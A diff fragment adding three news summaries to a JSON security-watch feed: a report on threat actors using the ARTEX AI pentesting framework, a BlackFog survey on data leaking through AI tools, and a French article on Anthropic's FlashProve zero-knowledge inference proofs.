+          "severity": "culture",
+          "score": 52,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Infosecurity Mag.\n\nA new Censys report showed that the use of ARTEX, an AI pentesting tool popular with threat actor, could be spreading far beyond initially reported campaigns\n\nThe use of a new AI-powered offensive security tool by cyber threat actors appears to be spreading well beyond the campaigns first identified.\n\nThis tool, called ARTEX, is an open-source, AI model-driven, autonomous penetration testing framework released on GitHub by a user known as ‘ Autumn-27 ’ in…",
+          "detail": "Signal de veille — Infosecurity Mag.\n\nA new Censys report showed that the use of ARTEX, an AI pentesting tool popular with threat actor, could be spreading far beyond initially reported campaigns\n\nThe use of a new AI-powered offensive security tool by cyber threat actors appears to be spreading well beyond the campaigns first identified.\n\nThis tool, called ARTEX, is an open-source, AI model-driven, autonomous penetration testing framework released on GitHub by a user known as ‘ Autumn-27 ’ in July 2026.\n\nWhile ARTEX has already been integrated in several known malicious campaigns since October, a new report by internet traffic scan provider Censys estimated its use could be much more widespread than previously thought.\n\nWritten in Go with an embedded Next.js web console, ARTEX offers an offensive command-and-control (C2) platform that communicates with several AI agents and can be plugged in to large language models (LLMs).\n\nIn October, two threat intelligence companies attributed its use as part of threat actor operations.\n\nFirst, in early October, CrowdStrike linked ARTEX to a campaign against South Korean financial institutions . The analysts found ARTEX was used alongside Anthropic’s Claude AI model during the campaign, which ran from late September to early October 2026. CrowdStrike assessed with moderate confidence that the attacker is a Chinese speaker and financially motivated.",
+          "action": null,
+          "image": "https://assets.infosecurity-magazine.com/webpage/og/ccc5a0c2-4ba9-420c-8100-1e04a4b725f9.jpg",
+          "sources": [
+            {
+              "url": "https://www.infosecurity-magazine.com/news/artex-activity-exceeds-reported/",
+              "label": "Infosecurity Mag"
+            }
+          ],
+          "url": "https://www.infosecurity-magazine.com/news/artex-activity-exceeds-reported/",
+          "pubDate": "2026-11-06T13:00:00.000Z"
+        },
+        {
+          "title": "Half of Security Leaders Report Sensitive Data Exposure Through AI Tools",
+          "cve": null,
+          "severity": "culture",
+          "score": 52,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Infosecurity Mag.\n\nBlackFog found a lack of visibility into data being shared with AI tools, even those approved for use in the enterprise\n\nAround half (47%) of security leaders have experienced sensitive data exposure through an AI tool at their organization, research by BlackFog has found.\n\nThe researchers said the findings demonstrate that many organizations lack visibility into the types of data being shared with AI tools, even those that are approved for use in the ente…",
+          "detail": "Signal de veille — Infosecurity Mag.\n\nBlackFog found a lack of visibility into data being shared with AI tools, even those approved for use in the enterprise\n\nAround half (47%) of security leaders have experienced sensitive data exposure through an AI tool at their organization, research by BlackFog has found.\n\nThe researchers said the findings demonstrate that many organizations lack visibility into the types of data being shared with AI tools, even those that are approved for use in the enterprise.\n\nWhile 62% of respondents could identify users or departments sending data to AI tools, less than half (48%) said they could provide any record of the types of data that had left the organization through AI tools.\n\n“This shows why security teams cannot stop at deciding which AI tools employees are allowed to use. Organizations also need to control what information is shared with them,\" commented Darren Williams, founder and CEO of BlackFog.\n\nAlmost all organizations (98%) reported having an AI usage policy in place. However, the ability to enforce such policies varied significantly.\n\nJust over half (56%) support their broader AI usage policies with comprehensive technical controls. Around a third (35%) said that while their organization has a written policy specifying what information employees must not enter into AI prompts, there is no technical enforcement.",
+          "action": null,
+          "image": "https://assets.infosecurity-magazine.com/webpage/og/35f03386-cccd-4814-ba7a-09e0c7e96bcc.jpeg",
+          "sources": [
+            {
+              "url": "https://www.infosecurity-magazine.com/news/security-data-exposure-ai/",
+              "label": "Infosecurity Mag"
+            }
+          ],
+          "url": "https://www.infosecurity-magazine.com/news/security-data-exposure-ai/",
+          "pubDate": "2026-11-06T09:15:00.000Z"
+        },
+        {
+          "title": "Anthropic tente de certifier mathématiquement l’inférence",
+          "cve": null,
+          "severity": "culture",
+          "score": 50,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Signal de veille — Silicon.fr.\n\nLorsqu&rsquo;on utilise un service d&rsquo;IA cloud, on peut souhaiter s&rsquo;assurer que le fournisseur a bien fait tourner le modèle attendu. Quantité de travaux de recherche ont mis en œuvre la preuve à divulgation nulle de connaissance pour servir cet objectif. On les regroupe communément sous l&rsquo;acronyme zKML ( Zero-Knowledge Machine Learning ). Anthropic s&rsquo;y est essayé avec un système intégralement logiciel appelé FlashProve .",
+          "detail": "Signal de veille — Silicon.fr.\n\nLorsqu&rsquo;on utilise un service d&rsquo;IA cloud, on peut souhaiter s&rsquo;assurer que le fournisseur a bien fait tourner le modèle attendu. Quantité de travaux de recherche ont mis en œuvre la preuve à divulgation nulle de connaissance pour servir cet objectif. On les regroupe communément sous l&rsquo;acronyme zKML ( Zero-Knowledge Machine Learning ). Anthropic s&rsquo;y est essayé avec un système intégralement logiciel appelé FlashProve . Un système valable sur architecture MoE Le mécanisme permet de démontrer qu&rsquo;une réponse est bien le résultat du calcul d&rsquo;un modèle donné, sans en révéler les poids. Le serveur génère d&rsquo;abord un « engagement » ; c&rsquo;est-à-dire une empreinte qui dit son choix exact de poids. Il produit ensuite, sur demande d&rsquo;un client, un fichier de preuve. Anthropic communique des performances pour une configuration bien spécifique. Dans les grandes lignes : Modèle MoE (Llama 4 Maverick) quantifié en 4 bits Serveur à 1 GPU H100 et 24 cœurs CPU Séquences d&rsquo;output de 1024 tokens traitées par lots de 24 La génération de l&#8217;empreinte cryptographique initiale prend à peu près 39 minutes. Cette empreinte pèse quelques Mo. Elle est réutilisable sur environ 16 millions de requêtes avant qu&rsquo;on doive la recalculer. Le débit de génération des preuves avoisine 110 tokens par seconde. Une preuve pèse en moyenne 18,78 Mo. Sa",
+          "action": null,
+          "image": "https://www.silicon.fr/wp-content/uploads/2026/11/Anthropic-FlashProve-1024x850.jpg",
+          "sources": [
+            {
+              "url": "https://www.silicon.fr/data-ia-1372/anthropic-flashprove-230148",
+              "label": "Silicon.fr"
+            }
+          ],
+          "url": "https://www.silicon.fr/data-ia-1372/anthropic-flashprove-230148",
+          "pubDate": "2026-11-06T13:00:59.000Z"
+        }
+      ]
+    }
+  ]
+}
